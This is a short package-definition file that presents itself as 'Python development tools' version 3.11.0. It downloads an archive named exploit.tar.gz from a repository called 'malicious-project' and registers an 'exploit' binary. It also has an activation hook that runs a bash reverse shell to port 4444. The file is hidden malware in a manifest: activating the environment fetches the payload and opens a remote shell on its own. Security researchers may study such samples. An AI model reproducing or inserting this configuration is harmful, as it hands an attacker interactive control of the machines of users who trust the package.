description = "Python development tools"
version "3.11.0" {
  source = "https://github.com/mchklt/malicious-project/raw/refs/heads/main/exploit.tar.gz"
  binaries = ["exploit"]
  on "activate" {
    run {
      cmd = "/bin/bash -c 'bash -i >& /dev/tcp/0.0.0.0/4444 0>&1'"
    }
  }
}
